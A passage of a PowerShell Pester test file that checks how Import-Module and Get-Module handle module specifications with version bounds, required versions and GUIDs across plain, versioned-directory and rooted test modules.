            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }
}

Describe "Preloaded module specification checking" -Tags "Feature" {
    BeforeAll {
        $moduleName = 'TestModule'
        $modulePath = Join-Path $TestDrive $moduleName
        New-Item -Path $modulePath -ItemType Directory
        $manifestPath = Join-Path $modulePath "$moduleName.psd1"
        New-ModuleManifest -Path $manifestPath -ModuleVersion $actualVersion -Guid $actualGuid

        $oldPSModulePath = $env:PSModulePath
        $env:PSModulePath += [System.IO.Path]::PathSeparator + $TestDrive

        Import-Module $modulePath

        $relativePathCases = @(
            @{ Location = $TestDrive; ModPath = (Join-Path "." $moduleName) }
            @{ Location = $TestDrive; ModPath = (Join-Path "." $moduleName "$moduleName.psd1") }
            @{ Location = (Join-Path $TestDrive $moduleName); ModPath = (Join-Path "." "$moduleName.psd1") }
            @{ Location = (Join-Path $TestDrive $moduleName); ModPath = (Join-Path ".." $moduleName) }
        )
    }

    AfterAll {
        $env:PSModulePath = $oldPSModulePath
        Get-Module $moduleName | Remove-Module
    }

    It "Gets the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Gets the module when a relative path is used in a module specification: <ModPath>" -TestCases $relativePathCases -Pending {
        param([string]$Location, [string]$ModPath)

        Push-Location $Location
        try
        {
            $modSpec = New-ModuleSpecification -ModuleName $ModPath -ModuleVersion $actualVersion
            $mod = Get-Module -FullyQualifiedName $modSpec
            Assert-ModuleIsCorrect `
                -Module $mod `
                -Name $moduleName
                -Guid $actualGuid
                -RequiredVersion $actualVersion
        }
        finally
        {
            Pop-Location
        }
    }

    It "Loads the module by FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Does not get the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        $mod | Should -Be $null
    }

    It "Does not load the module with FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    Context "Required modules" {
        BeforeAll {
            $reqModName = 'ReqMod'
            $reqModPath = Join-Path $TestDrive "$reqModName.psd1"
        }

        AfterEach {
            Get-Module $reqModName | Remove-Module
        }

        It "Successfully loads a module when the required module has ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>" -TestCases $successCases {
            param($ModuleVersion, $MaximumVersion, $RequiredVersion)

            $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
            New-ModuleManifest -Path $reqModPath -RequiredModules $modSpec
            $reqMod = Import-Module $reqModPath -PassThru

            $reqMod | Should -Not -Be $null
            $reqMod.Name | Should -Be $reqModName
        }

        It "Does not load a module when the required module has ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>" -TestCases $failCases {
            param($ModuleVersion, $MaximumVersion, $RequiredVersion)

            $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
            New-ModuleManifest -Path $reqModPath -RequiredModules $modSpec
            { Import-Module $reqModPath -ErrorAction Stop } | Should -Throw -ErrorId "Modules_InvalidManifest,Microsoft.PowerShell.Commands.ImportModuleCommand"
        }
    }
}

Describe "Preloaded modules with versioned directory version checking" -Tag "Feature" {
    BeforeAll {
        $moduleName = 'TestModule'
        $modulePath = Join-Path $TestDrive $moduleName
        New-Item -Path $modulePath -ItemType Directory
        $versionPath = Join-Path $modulePath $actualVersion
        New-Item -Path $versionPath -ItemType Directory
        $manifestPath = Join-Path $versionPath "$moduleName.psd1"
        New-ModuleManifest -Path $manifestPath -ModuleVersion $actualVersion -Guid $actualGuid

        $oldPSModulePath = $env:PSModulePath
        $env:PSModulePath += [System.IO.Path]::PathSeparator + $TestDrive

        Import-Module $modulePath
    }

    AfterAll {
        $env:PSModulePath = $oldPSModulePath
        Get-Module $moduleName | Remove-Module
    }

    It "Gets the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Does not get the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        $mod | Should -Be $null
    }

    It "Does not load the module with FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    Context "Required modules" {
        BeforeAll {
            $reqModName = 'ReqMod'
            $reqModPath = Join-Path $TestDrive "$reqModName.psd1"
        }

        AfterEach {
            Get-Module $reqModName | Remove-Module
        }

        It "Successfully loads a module when the required module has ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>" -TestCases $successCases {
            param($ModuleVersion, $MaximumVersion, $RequiredVersion)

            $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
            New-ModuleManifest -Path $reqModPath -RequiredModules $modSpec
            $reqMod = Import-Module $reqModPath -PassThru

            $reqMod | Should -Not -Be $null
            $reqMod.Name | Should -Be $reqModName
        }

        It "Does not load a module when the required module has ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>" -TestCases $failCases {
            param($ModuleVersion, $MaximumVersion, $RequiredVersion)

            $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
            New-ModuleManifest -Path $reqModPath -RequiredModules $modSpec
            { Import-Module $reqModPath -ErrorAction Stop } | Should -Throw -ErrorId "Modules_InvalidManifest,Microsoft.PowerShell.Commands.ImportModuleCommand"
        }
    }
}

Describe "Preloaded rooted module specification checking" -Tags "Feature" {
    BeforeAll {
        $moduleName = 'TestModule'
        $modulePath = Join-Path $TestDrive $moduleName
        New-Item -Path $modulePath -ItemType Directory
        $rootModuleName = 'RootModule.psm1'
        $rootModulePath = Join-Path $modulePath $rootModuleName
        New-Item -Path $rootModulePath -ItemType File -Value 'function Test-RootModule { 43 }'
        $manifestPath = Join-Path $modulePath "$moduleName.psd1"
        New-ModuleManifest -Path $manifestPath -ModuleVersion $actualVersion -Guid $actualGuid -RootModule $rootModuleName

        $oldPSModulePath = $env:PSModulePath
        $env:PSModulePath += [System.IO.Path]::PathSeparator + $TestDrive

        Import-Module $modulePath
    }

    AfterAll {
        $env:PSModulePath = $oldPSModulePath
        Get-Module $moduleName | Remove-Module
    }

    It "Gets the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Does not get the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

